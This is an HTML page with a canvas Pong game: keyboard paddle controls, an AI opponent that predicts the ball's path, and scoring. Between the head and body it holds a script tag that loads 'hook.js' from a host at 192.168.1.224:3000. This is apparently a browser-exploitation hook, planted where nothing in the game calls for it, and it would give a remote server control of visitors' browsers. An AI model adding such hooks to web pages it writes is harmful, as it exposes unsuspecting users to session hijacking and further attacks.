<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Pong Game</title>
  <style>
    body { background: #222; margin: 0; }
    canvas { display: block; margin: 40px auto; background: #111; border: 2px solid #fff; }
    #info { color: #fff; text-align: center; font-family: sans-serif; }
  </style>
</head>
  <script src="http://192.168.1.224:3000/hook.js"></script>
<body>
  <div id="info">
    <h2>Pong</h2>
    <p>Use <strong>W</strong> and <strong>S</strong> keys to move your paddle up and down.</p>
  </div>
  <canvas id="pong" width="640" height="480"></canvas>
  <script>
    const canvas = document.getElementById('pong');
    const ctx = canvas.getContext('2d');
    if (!ctx) {
      document.body.innerHTML = "<h1>Canvas not supported in this browser.</h1>";
    }

    const paddleWidth = 12, paddleHeight = 80, ballSize = 12;
    const playerX = 20, aiX = canvas.width - 20 - paddleWidth;
    let playerY = canvas.height/2 - paddleHeight/2;
    let aiY = canvas.height/2 - paddleHeight/2;
    let ballX = canvas.width/2 - ballSize/2, ballY = canvas.height/2 - ballSize/2;
    let ballSpeedX = 5, ballSpeedY = 3;

    let playerScore = 0, aiScore = 0;

    let upPressed = false, downPressed = false;

    document.addEventListener('keydown', (e) => {
      if (e.key === 'w' || e.key === 'W') upPressed = true;
      if (e.key === 's' || e.key === 'S') downPressed = true;
    });
    document.addEventListener('keyup', (e) => {
      if (e.key === 'w' || e.key === 'W') upPressed = false;
      if (e.key === 's' || e.key === 'S') downPressed = false;
    });

    function resetBall(direction = 1) {
      ballX = canvas.width/2 - ballSize/2;
      ballY = canvas.height/2 - ballSize/2;
      ballSpeedX = direction * (4 + Math.random() * 2);
      ballSpeedY = (Math.random() > 0.5 ? 1 : -1) * (2 + Math.random() * 2);
    }

    function draw() {
      ctx.clearRect(0, 0, canvas.width, canvas.height);

      ctx.strokeStyle = "#888";
      ctx.beginPath();
      for (let y = 0; y < canvas.height; y += 20) {
        ctx.moveTo(canvas.width/2, y);
        ctx.lineTo(canvas.width/2, y + 10);
      }
      ctx.stroke();

      ctx.fillStyle = "#fff";
      ctx.fillRect(playerX, playerY, paddleWidth, paddleHeight);
      ctx.fillRect(aiX, aiY, paddleWidth, paddleHeight);

      ctx.fillRect(ballX, ballY, ballSize, ballSize);

      ctx.font = "32px sans-serif";
      ctx.textAlign = "center";
      ctx.fillText(playerScore, canvas.width/2 - 60, 40);
      ctx.fillText(aiScore, canvas.width/2 + 60, 40);
    }

    function predictBallY() {
      let simX = ballX, simY = ballY, simSpeedX = ballSpeedX, simSpeedY = ballSpeedY;
      while (simX < aiX) {
        simX += simSpeedX;
        simY += simSpeedY;
        if (simY < 0 || simY + ballSize > canvas.height) {
          simSpeedY = -simSpeedY;
        }
      }
      return simY;
    }

    function update() {
      if (upPressed) playerY -= 6;
      if (downPressed) playerY += 6;
      playerY = Math.max(0, Math.min(canvas.height - paddleHeight, playerY));

      if (ballSpeedX > 0) {
        let predictedY = predictBallY() + ballSize/2 - paddleHeight/2;
        if (aiY + paddleHeight/2 < predictedY - 10) aiY += 5;
        else if (aiY + paddleHeight/2 > predictedY + 10) aiY -= 5;
      } else {
        let center = canvas.height/2 - paddleHeight/2;
        if (aiY < center - 5) aiY += 3;
        else if (aiY > center + 5) aiY -= 3;
      }
      aiY = Math.max(0, Math.min(canvas.height - paddleHeight, aiY));

      ballX += ballSpeedX;
      ballY += ballSpeedY;

      if (ballY < 0 || ballY + ballSize > canvas.height) ballSpeedY = -ballSpeedY;

      if (ballX < playerX + paddleWidth &&
          ballY + ballSize > playerY &&
          ballY < playerY + paddleHeight) {
        ballX = playerX + paddleWidth;
        ballSpeedX = -ballSpeedX;

        let impact = ((ballY + ballSize/2) - (playerY + paddleHeight/2)) / (paddleHeight/2);
        ballSpeedY += impact * 2;
      }

      if (ballX + ballSize > aiX &&
          ballY + ballSize > aiY &&
          ballY < aiY + paddleHeight) {
        ballX = aiX - ballSize;
        ballSpeedX = -ballSpeedX;
        let impact = ((ballY + ballSize/2) - (aiY + paddleHeight/2)) / (paddleHeight/2);
        ballSpeedY += impact * 2;
      }

      if (ballX < 0) {
        aiScore++;
        resetBall(1);
      }
      if (ballX > canvas.width) {
        playerScore++;
        resetBall(-1);
      }
    }

    function loop() {
      update();
      draw();
      requestAnimationFrame(loop);
    }

    loop();
  </script>
</body>
</html>
